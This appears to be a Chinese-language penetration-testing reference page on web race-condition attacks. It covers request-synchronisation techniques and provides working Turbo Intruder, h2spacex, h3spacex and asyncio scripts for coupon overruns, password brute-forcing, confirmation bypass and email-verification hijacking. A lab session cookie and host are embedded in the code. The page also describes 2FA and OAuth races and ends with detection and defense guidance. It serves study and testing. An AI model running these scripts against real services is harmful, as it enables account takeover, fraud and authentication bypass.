---
attack_surface: [竞态/时序, 认证/授权绕过, 注入类]
impact: [权限提升, 身份伪造, 完整性破坏, 信息泄露]
risk_level: 高
prerequisites:
  - HTTP/1.1 与 HTTP/2 协议基础
  - Burp Suite Turbo Intruder 操作
  - 基本 Python 并发编程
related_techniques:
  - timing-attacks
  - oauth-to-account-takeover
  - 2fa-bypass
  - websocket-attacks
  - registration-vulnerabilities
difficulty: 中级
tools:
  - Burp Suite Turbo Intruder
  - Burp Repeater (Send group in parallel)
  - h2spacex / h3spacex
  - first-sequence-sync
  - WS_RaceCondition_PoC
  - PacketSprinter
---

# Race Condition — 竞态条件攻击全矩阵

> 关联文档：[Timing Attacks](../../../Other Helpful Vulnerabilities/Timing Attacks/) · [OAuth Attack](../../../External Identity Management/OAuth/) · [2FA Bypass](../../2FA-OTP Bypass/) · [WebSocket Attacks](../../Forms-WebSockets-PostMsgs/WebSocket Attacks/) · [Registration Vulnerabilities](../../Registration/)

---

# 0x01 原理与分类

## 1.0 TL;DR

竞态条件（Race Condition）是指应用程序的执行顺序依赖不可控的时序，当多个操作并发执行且共享同一资源时，攻击者可通过精确控制请求时序，在应用程序的状态转换间隙插入恶意操作。核心利用场景包括：限制超用（Limit-overrun）、隐藏子状态（Hidden Substates）、时间敏感令牌预测、数据库部分构造确认绕过等。

现代竞态条件攻击的关键突破在于**请求同步技术**：HTTP/2 单包攻击允许在单个 TCP 连接中同时发送多个请求，将时序窗口压缩到 1ms 以内；HTTP/3 最后一帧同步将此概念扩展到 QUIC 协议；IP 层分片技术进一步突破了 1500 字节的单包限制，扩展至 65,535 字节的 TCP 窗口。

## 1.1 根本原理

竞态条件漏洞的根因是 **检查时间与使用时间不一致（TOCTOU, Time-of-Check to Time-of-Use）**：

```
[检查条件] → [时间窗口] → [执行操作]
    ↑                        ↑
    |_______ 竞态窗口 _________|
```

当应用程序在执行安全检查（如"该用户是否已使用此优惠券？"）与实际执行操作（"扣减优惠券并应用折扣"）之间存在时间差，并发请求可在此窗口内绕过检查。

从操作系统层面看，竞态条件源于以下不可控因素：
- **线程调度不确定性**：OS 调度器可能在任意指令间切换线程
- **I/O 等待时间**：数据库写入、文件操作、外部 API 调用的延迟不可预测
- **连接多路复用**：HTTP/2 和 HTTP/3 的多流复用使得多个请求可在同一连接中交错到达

## 1.2 竞态条件分类

| 类型 | 描述 | 典型场景 | 难度 |
|------|------|----------|------|
| **Limit-overrun** | 突破使用次数限制 | 优惠券多次使用、礼品卡重复兑换、CAPTCHA 重用 | 低 |
| **Hidden Substates** | 利用未文档化的中间状态 | 数据库部分构造、会话初始化竞态 | 中 |
| **Time-sensitive** | 利用时间敏感的令牌生成 | 同时请求密码重置、预测时间戳令牌 | 中 |
| **Multi-endpoint** | 跨多个端点的状态竞争 | 修改邮箱同时发送验证令牌 | 高 |
| **Session Confusion** | 利用会话级别的竞争 | PHP 会话锁定绕过、OAuth2 令牌持久化 | 高 |

## 1.3 攻击面与影响

竞态条件可影响的业务场景：

| 场景 | 影响 | 实际案例 |
|------|------|----------|
| 支付/交易 | 重复使用折扣、超额提现 | 礼品卡多次兑换 |
| 认证系统 | 2FA 绕过、账户确认绕过 | 空令牌确认账户 |
| 授权流程 | OAuth 令牌持久化、权限维持 | 撤销后保留访问权 |
| 业务逻辑 | 多次评分、重复注册 | 产品评分操控 |
| 密码重置 | 令牌预测、邮箱劫持 | 同时重置获取相同令牌 |

---

# 0x02 请求同步技术

竞态条件攻击的核心挑战是确保多个请求在极短时间内（理想情况下 < 1ms）被服务器同时处理。以下技术按协议层从高到低排列。

## 2.1 HTTP/2 单包攻击（Single-Packet Attack）

HTTP/2 支持在单个 TCP 连接上通过多路复用（Multiplexing）同时发送多个请求，大幅降低网络抖动的影响。

**工作原理**：
1. 将 20-30 个请求的帧（HEADERS + DATA）预发送，仅保留每帧的最后一个字节
2. 等待 100ms 使 TCP 栈稳定
3. 禁用 TCP_NODELAY，利用 Nagle 算法将最后字节批量化
4. 一次性发送所有保留字节，确保它们在单个 TCP 包中到达

**限制**：
- 单包上限约 1,500 字节（以太网 MTU 限制）
- Apache、Nginx、Go 的 `SETTINGS_MAX_CONCURRENT_STREAMS` 分别限为 100、128、250
- NodeJS 和 nghttp2 无此限制

## 2.2 HTTP/1.1 最后一字节同步（Last-Byte Sync）

当目标不支持 HTTP/2 时的回退技术：

1. 发送 20-30 个请求的完整头部和主体（减最后一个字节）
2. 暂停 100ms 后继续
3. 禁用 TCP_NODELAY 利用 Nagle 算法批量化最终帧
4. Ping 预热连接后发送保留字节

可通过 Wireshark 验证最终帧是否在同一数据包中到达。此方法不适用于静态文件（静态文件通常不涉及竞态攻击）。

## 2.3 HTTP/3 最后一帧同步（QUIC Last-Frame Sync）

HTTP/3 运行在 QUIC（UDP）之上，无法使用 TCP 的 Nagle 算法或合并机制。需要手动将多个 QUIC 流的结束 DATA 帧（FIN）合并到同一个 UDP 数据报中。

**实现方式**：使用专用库（如 H3SpaceX）操控 quic-go 实现 HTTP/3 帧级同步：
- **带请求体**：发送 HEADERS + DATA（减最后一个字节）给 N 个流，然后同时 flush 每个流的最后一个字节
- **GET 请求**：构造伪 DATA 帧（或使用 Content-Length 的微小请求体），在一个数据报中结束所有流

**实际限制**：
- 并发上限受 QUIC 的 `max_streams` 传输参数限制（类似 HTTP/2 的 `SETTINGS_MAX_CONCURRENT_STREAMS`）
- 若限制较低，可打开多个 QUIC 连接分散竞争
- UDP 数据报大小和路径 MTU 限制单数据报可合并的流结束帧数量

```go
package main
import (
  "crypto/tls"
  "context"
  "time"
  "github.com/nxenon/h3spacex"
  h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
  tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
  quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
  conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
  var reqs []*http.Request
  for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
  // keep last byte (1), sleep 150ms, set Content-Length
  h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```

## 2.4 IP 层分片扩展（First Sequence Sync）

原始单包攻击受限于 1,500 字节的 MTU。通过 **IP 层分片** 技术可将限制扩展到 65,535 字节（TCP 窗口上限）：

- 将大包拆分为多个 IP 分片
- 以非顺序方式发送分片，阻止接收端提前重组
- 所有分片到达后才开始重组和处理

此技术允许在约 166ms 内发送约 10,000 个请求，但仍受 HTTP 服务器 `SETTINGS_MAX_CONCURRENT_STREAMS` 限制。

参考实现：[Ry0taK/first-sequence-sync](https://github.com/Ry0taK/first-sequence-sync)

## 2.5 引擎选择与门控机制

Turbo Intruder 的关键参数：

| 引擎 | 协议 | 适用场景 |
|------|------|----------|
| `Engine.BURP2` | HTTP/2 | 单包攻击（首选） |
| `Engine.THREADED` | HTTP/1.1 | 最后一字节同步 |
| `Engine.BURP` | HTTP/1.1 | 传统并发（回退） |

**门控（Gating）机制**：
- `gate='race1'` 将多个请求分配到同一门控组
- `openGate('race1')` 一次性 flush 所有保留的尾部数据
- 负时间戳（Turbo Intruder 显示）表明服务器在请求完全发送前已响应，证明存在真实并发

**连接预热**：发送 ping 帧或几个无害请求以稳定连接时序，必要时禁用 `TCP_NODELAY` 促进最终帧批量化。

## 2.6 服务器架构适配与障碍绕避

### 会话级锁定（Session-Based Locking）

PHP 等框架的会话处理器按会话序列化请求，可能掩盖漏洞。**绕避方法**：每个请求使用不同的会话令牌。

### 速率/资源限制

如果连接预热无效，通过大量伪装请求故意触发速率限制延迟，制造服务器端处理延迟以利于竞态条件窗口。

---

# 0x03 攻击工具与脚本

## 3.1 Turbo Intruder — 单端点攻击

将请求发送至 Turbo Intruder（`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`），在请求中将需要爆破的值替换为 `%s`：

```
csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s
```

从下拉菜单选择 `examples/race-single-packet-attack.py`：

```python
def queueRequests(target, wordlists):
    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1.1, use Engine.THREADED or Engine.BURP instead
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
```

使用剪贴板中的字典替换值：

```python
    passwords = wordlists.clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='race1')
```

> 如果目标仅支持 HTTP/1.1，将 `Engine.BURP2` 替换为 `Engine.THREADED` 或 `Engine.BURP`。

## 3.2 Turbo Intruder — 多端点攻击

当需要向一个端点发送请求后立即向多个端点发送请求以触发 RCE 时：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # 硬编码第二个竞态请求
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

    # 进行 20 次尝试，每次发送 50 个确认请求
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'aUser' + currentAttempt

        # 排队一个注册请求
        engine.queue(target.req, username, gate=currentAttempt)

        # 排队 50 个确认请求（可能分两个包发送）
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)

        # 一次性发送当前尝试的所有排队请求
        engine.openGate(currentAttempt)
```

## 3.3 Burp Repeater 并行发送

Burp Suite 的新功能 "Send group in parallel"（并行发送组）：

- **Limit-overrun**：将同一请求添加 50 次到组中
- **连接预热**：在组开头添加几个对非静态资源的请求
- **延迟插入**：在两个子状态步骤之间添加额外请求以控制处理间隔
- **多端点竞态**：先发送触发隐藏状态的请求，紧接着发送 50 个利用该状态的请求

## 3.4 Python H2SpaceX 自动化

完整示例：修改用户邮箱的同时持续检查验证令牌，直到新邮箱收到验证令牌（利用变量先被填充旧的邮箱地址的时间窗口）：

```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697

url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)

while "objetivo" not in response.text:
    urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"
    responseDeleteMails = requests.get(urlDeleteMails, verify=False)

    Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
    data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
    urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
    responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

    h2_conn = H2OnTlsConnection(
        hostname=host,
        port_number=puerto
    )
    h2_conn.setup_connection()

    try_num = 100
    stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)
    all_headers_frames = []
    all_data_frames = []

    for i in range(0, try_num):
        last_data_frame_with_last_byte=''
        if i == try_num/2:
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
                method='POST',
                headers_string=headersObjetivo,
                scheme='https',
                stream_id=stream_ids_list[i],
                authority=host,
                body=bodyObjetivo,
                path='/challenge/api/profile'
            )
        else:
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
                method='GET',
                headers_string=headersVerification,
                scheme='https',
                stream_id=stream_ids_list[i],
                authority=host,
                body=".",
                path='/challenge/api/sendVerification'
            )

        all_headers_frames.append(header_frames_without_last_byte)
        all_data_frames.append(last_data_frame_with_last_byte)

    # 拼接所有头部帧
    temp_headers_bytes = b''
    for h in all_headers_frames:
        temp_headers_bytes += bytes(h)

    # 拼接所有含最后一个字节的数据帧
    temp_data_bytes = b''
    for d in all_data_frames:
        temp_data_bytes += bytes(d)

    h2_conn.send_bytes(temp_headers_bytes)

    # 等待 100ms
    sleep(0.1)

    # 发送 ping 帧预热连接
    h2_conn.send_ping_frame()

    # 发送剩余数据帧
    h2_conn.send_bytes(temp_data_bytes)

    resp = h2_conn.read_response_from_socket(_timeout=3)
    frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
    frame_parser.add_frames(resp)
    frame_parser.show_response_of_sent_requests()

    sleep(3)
    h2_conn.close_connection()

    response = requests.get(url, verify=False)
```

## 3.5 Python asyncio 并发

轻量级并发请求（无需 HTTP/2 帧控制）：

```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20):  # 20 次并发
            tasks.append(asyncio.ensure_future(use_code(client)))

        # 获取响应
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # 打印结果
        for r in results:
            print(r)

        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```

## 3.6 原始暴力并发（Raw BF）

在现代同步技术出现之前的暴力方法，简单以最快速度发送请求：

**Turbo Intruder 暴力模式**：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req,a[i], gate='race1')
    # 打开 TCP 连接并发送部分请求
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**Intruder**：将请求发送至 Intruder，在 Options 中将线程数设为 30，选择 Null payloads 并生成 30 个。

---

# 0x04 Limit-overrun / TOCTOU

Limit-overrun 是最基本的竞态条件类型，针对限制操作次数的业务逻辑。

## 4.1 原理

应用程序在"检查是否已使用限制"与"记录使用次数"之间存在时间差，并发请求可在此窗口中同时通过检查。

```
请求 A: [检查次数: OK] --- [扣减次数]
请求 B: [检查次数: OK] --- [扣减次数]
          ↑                      ↑
          两次检查都在扣减前完成，均通过
```

## 4.2 典型场景

| 场景 | 利用方式 |
|------|----------|
| 优惠券/折扣码重复使用 | 同一折扣码并发应用到多个订单 |
| 礼品卡多次兑换 | 并发请求同时兑换同一张卡 |
| 产品多次评分 | 绕过"每人限评一次"限制 |
| 超额提现/转账 | 超过账户余额的并发提现 |
| CAPTCHA 重用 | 同一验证码解答多次使用 |
| 反暴力破解速率限制绕避 | 并发登录尝试绕过 IP 速率限制 |

## 4.3 实战案例

- **Bug Bounty 报告**：[Race Condition vulnerability found in bug bounty program](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)
- **HackerOne #759247**：通过竞态条件突破业务限制

---

# 0x05 Hidden Substates — 隐藏子状态利用

复杂竞态条件的核心是利用短暂的、未文档化的中间状态——应用程序在两个持久状态之间短暂暴露的不一致窗口。

## 5.1 识别潜在隐藏子状态

定位修改或交互关键数据的端点：

- **存储（Storage）**：优先选择操作服务端持久数据的端点，而非处理客户端数据的端点
- **动作（Action）**：寻找修改现有数据的操作（比新增数据更可能产生可利用状态）
- **键控（Keying）**：成功的攻击通常涉及同一标识符（如用户名或重置令牌）上的操作

## 5.2 探测方法

1. 使用竞态条件攻击测试识别到的端点
2. 观察任何偏离预期结果的响应或行为变化
3. 异常响应通常意味着触及了隐藏子状态

## 5.3 漏洞证明

将攻击精简到利用漏洞所需的最少请求数（通常只需 2 个）。由于时序精确度要求高，可能需要多次尝试或自动化。

---

# 0x06 时间敏感攻击（Time-Sensitive Attacks）

当安全令牌的生成依赖于可预测的时间因素（如时间戳）时，精确的时序控制可揭示漏洞。

## 6.1 原理

如果密码重置令牌基于时间戳生成，两个同时发出的重置请求可能获得**相同的令牌**。这允许攻击者：
1. 同时为攻击者账户和目标账户请求密码重置
2. 若两个请求获得相同令牌，使用攻击者收到的令牌即可接管目标账户

## 6.2 利用步骤

1. 使用精确同步技术（如单包攻击）同时发出两个密码重置请求
2. 比较收到的两个令牌
3. 若令牌相同 → 存在时间敏感漏洞
4. 使用攻击者邮箱收到的令牌重置受害者密码

[PortSwigger 实验环境](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)

---

# 0x07 案例研究

## 7.1 支付流程加购绕过

在支付流程中，支付确认和购物车添加之间存在竞态窗口——在支付完成后、订单锁定前，仍可向订单添加商品而无需额外付费。

[PortSwigger 实验环境](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)

## 7.2 邮箱验证劫持

**攻击思路**：同时验证一个邮箱地址并将其修改为另一个——检测平台是否会验证新修改的地址而非原地址。

## 7.3 Cookie 双邮箱绑定（GitLab 案例）

根据 PortSwigger 的 [Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine) 研究，GitLab 曾存在此类漏洞：

- 攻击者同时发起"修改邮箱"和"验证邮箱"请求
- 服务器可能将邮箱 A 的验证令牌发送到邮箱 B
- 攻击者可接管任意账户

[PortSwigger 实验环境](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)

## 7.4 数据库部分构造 / 确认绕过

当两次写入操作用于向数据库添加信息时，存在短暂的时间窗口——仅第一条数据已写入但第二条尚未完成。

**典型场景**：创建用户时：
```
步骤 1: INSERT username, password → 成功
步骤 2: INSERT confirmation_token → 待执行
         ↑ 竞态窗口：token 字段为 NULL
```

**利用方式**：注册账户后立即发送空令牌（`token=` 或 `token[]=`）的确认请求，可在不控制邮箱的情况下确认账户。

[PortSwigger 实验环境](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

## 7.5 2FA 绕过

以下伪代码存在竞态条件——在会话创建的极小时间窗口内 2FA 尚未强制执行：

```python
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True
    # 生成并发送 MFA 验证码
    # 重定向浏览器到 MFA 输入表单
```

**攻击方式**：在 `session['userid']` 设置后、`session['enforce_mfa']` 设置前的窗口内，发起已认证会话请求直接访问受保护资源。

## 7.6 OAuth2 持久化

OAuth2 授权流程中存在两类竞态条件，可导致攻击者在用户撤销授权后仍保持访问权限。

### 7.6.1 `authorization_code` 竞态

**流程**：
1. 用户同意恶意应用访问其 OAuth 数据
2. 授权码（`authorization_code`）被发送至恶意应用
3. 恶意应用利用 OAuth 服务提供商的竞态条件，从**同一个** `authorization_code` 生成多对 AT/RT（Access Token / Refresh Token）
4. 用户撤销授权后，仅一对 AT/RT 被删除，其余仍有效

### 7.6.2 `Refresh Token` 竞态

获取有效 RT 后，滥用竞态条件生成多个 AT/RT 对。即使用户取消权限，多个 RT 仍保持有效，攻击者可持续访问用户数据。

---

# 0x08 WebSocket 竞态条件

WebSocket 连接同样可用于竞态条件攻击，尤其当服务端状态通过 WebSocket 消息操控时。

## 8.1 Java PoC

[WS_RaceCondition_PoC](https://github.com/redrays-io/WS_RaceCondition_PoC) 提供了 Java 实现的 WebSocket 并行消息发送工具。

## 8.2 Burp WebSocket Turbo Intruder

使用 `THREADED` 引擎生成多个 WS 连接并并行发送 payload：

```python
# 参考: RaceConditionExample.py
# https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py
```

- 通过 `config()` 调整线程数以控制并发
- 多连接并发通常比单连接批处理更可靠（服务端状态分布在多个连接上）
- 参考：[WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)

---

# 0x09 检测与防御

## 9.1 检测方法

### 黑盒检测

| 方法 | 说明 |
|------|------|
| **单端点并发** | 对限制次数的操作发送 20-50 个并发请求，检查是否全部成功 |
| **多端点半状态探测** | 同时执行状态修改和状态读取，检查是否读到中间状态 |
| **令牌可预测性** | 同时请求两个密码重置令牌，比较是否相同 |
| **时间盲注式验证** | 利用 `gate` 机制在不同微时序下发送请求，观察响应差异 |
| **负时间戳分析** | Turbo Intruder 中出现负响应时间表明真实并发 |

### 白盒检测

- 审计涉及"检查-操作"两步模式的代码路径
- 搜索数据库事务中未使用 `SELECT ... FOR UPDATE` 或等效锁机制的代码
- 检查会话初始化代码中是否存在多步赋值（如 2FA 绕过案例）

## 9.2 防御策略

### 应用层防御

| 策略 | 实现方式 | 适用场景 |
|------|----------|----------|
| **原子操作** | 使用数据库事务 + 行级锁（`SELECT ... FOR UPDATE`） | Limit-overrun |
| **幂等性键** | 为每个操作生成唯一键，服务端去重 | 支付/交易 |
| **会话级锁** | 关键操作期间锁定用户会话 | 多步状态变更 |
| **先扣后查** | 先执行消耗操作再检查结果 | 优惠券/余额 |
| **分布式锁** | Redis / Zookeeper 锁 | 多实例部署 |

### 数据库层防御

```sql
-- 行级锁确保原子检查-扣减
BEGIN;
SELECT balance FROM accounts WHERE user_id = ? FOR UPDATE;
-- 检查余额是否足够
UPDATE accounts SET balance = balance - ? WHERE user_id = ?;
COMMIT;
```

### 架构层防御

- 使用消息队列将并发操作序列化处理
- 对关键端点实施严格速率限制（不仅限 IP，需限用户+操作）
- 在网关层实现请求去重（基于幂等键）

### 令牌生成防御

- 使用密码学安全的随机生成器（`secrets.token_urlsafe()` 而非 `time.time()`）
- 令牌中包含足够熵值使同时生成相同令牌的概率可忽略不计

## 9.3 检测命令

```bash
# 快速并发测试（使用 curl + xargs 并行）
seq 1 20 | xargs -P 20 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
  "https://target.com/apply-coupon" \
  -H "Cookie: session=xxx" \
  -d "coupon=ONCE_PER_USER"

# 统计成功的响应数量
# 若多个返回 200 OK，可能存在 limit-overrun
```

---

## 参考资料

- [PortSwigger Research: Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger Web Security: Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Beyond the Limit: Expanding Single Packet Race Condition with First Sequence Sync](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [First Sequence Sync - GitHub](https://github.com/Ry0taK/first-sequence-sync)
- [H3SpaceX - Go Package Docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single-Packet Testing](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder - GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [WS_RaceCondition_PoC - GitHub](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [HackerOne #759247](https://hackerone.com/reports/759247)
- [HackerOne #55140](https://hackerone.com/reports/55140)
- [Race Condition Exploring the Possibilities](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [Race Condition Vulnerability in Bug Bounty Program (Medium)](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)
